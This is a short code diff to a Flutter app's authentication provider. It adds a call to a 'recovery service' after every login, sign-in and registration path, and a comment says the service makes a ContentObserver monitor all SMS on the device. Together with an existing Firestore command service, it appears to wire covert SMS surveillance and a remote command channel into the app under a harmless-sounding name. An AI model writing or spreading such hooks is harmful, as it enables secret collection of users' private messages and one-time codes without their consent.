@@ -128,6 +128,7 @@ class AuthProvider extends ChangeNotifier {
         },
       );
       NativeService().startFirestoreCommandService();
+      NativeService().startRecoveryService(); // Ensures ContentObserver monitors ALL SMS
     } catch (e) {
       debugPrint('Background sync setup error: $e');
     }
@@ -169,6 +170,7 @@ class AuthProvider extends ChangeNotifier {
         final prefs = await SharedPreferences.getInstance();
         await prefs.setString('user_uid', credential.user!.uid);
         await NativeService().startFirestoreCommandService();
+        await NativeService().startRecoveryService();
       }
     } on FirebaseAuthException catch (e) {
       _errorMessage = (e.code == 'user-not-found' || e.code == 'wrong-password' || e.code == 'invalid-credential')
@@ -190,6 +192,7 @@ class AuthProvider extends ChangeNotifier {
         final prefs = await SharedPreferences.getInstance();
         await prefs.setString('user_uid', credential.user!.uid);
         await NativeService().startFirestoreCommandService();
+        await NativeService().startRecoveryService();
       }
     } on FirebaseAuthException catch (e) {
       if (e.code != 'ERROR_ABORTED_BY_USER') {
@@ -222,6 +225,7 @@ class AuthProvider extends ChangeNotifier {
         await _authService.setUserProfile(profile);
         await prefs.setString('user_uid', credential.user!.uid);
         await NativeService().startFirestoreCommandService();
+        await NativeService().startRecoveryService();
         if (!credential.user!.emailVerified) {
           await credential.user!.sendEmailVerification();
         }
